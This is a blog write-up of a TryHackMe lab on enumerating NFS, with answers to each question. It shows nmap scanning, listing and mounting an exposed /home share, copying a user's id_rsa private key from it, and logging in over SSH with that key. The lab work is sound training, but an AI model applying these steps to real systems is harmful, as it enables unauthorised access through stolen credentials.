---
title:  "TryHackMe: Enumerating NFS"
date:   2021-03-14 23:36:00 +1100
excerpt: Enumerating NFS with nmap.
---

This is a write up for the **Enumerating NFS** task of the [**Network Services 2**](https://tryhackme.com/room/networkservices2) room on [TryHackMe](https://tryhackme.com). Some tasks have been omitted as they do not require an answer.

***

### Conduct a thorough port scan scan of your choosing, how many ports are open?

Run a full nmap scan on the machine.

```
nmap -A -p- <ip>
```

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/01-nmap.jpg">

> Answer: **7**

### Which port contains the service we're looking to enumerate?

NFS is running on port 2049.

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/01-nmap.jpg">

> Answer: **2049**

### Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

Execute the command as instructed:

```
/usr/sbin/showmount -e <ip>
```

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/02-showmount.jpg">

> Answer: **/home**

### Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?

Use the mkdir command as instructed:

```
mkdir /tmp/mount
```

Use the mount command as described in the introduction for the task.

```
sudo mount -t nfs <ip>:/home /tmp/mount/ -nolock
```

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/03-mount.jpg">

> Answer: **cappucino**

### Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

List out the contents of the folder:

```
ls -a
```

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/04-ls.jpg">

Keys would likely be stored in the ```.ssh``` folder.

> Answer: **.ssh**

### Which of these keys is most useful to us?

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/05-id-rsa.jpg">

id_rsa is the file which will contain the user's private key.

> Answer: **id_rsa**

### Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

Copy the **id_rsa** files to your **.ssh** folder.

```
cp id_rsa* ~/.ssh
```

Navigate to the **.ssh** folder and open the **id_rsa.pub** file to get the username.

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/06-copy.jpg">

Now change ownership of the id_rsa files so we can ssh into the server.

```
chmod 600 id_rsa
```

Connect to the server via ssh.

```
ssh -i id_rsa cappucino@<ip>
```

<img src="{{ site.baseurl }}/assets/images/2021-03-14-enumerating-nfs/07-ssh.jpg">

> Answer: **Y**

### Recap

In this task we learnt how to:
 * Use **nmap** to conduct a port scan
 * Leverage **showmount** to display the nfs share name
 * Use **mount** to mount the share to our local machine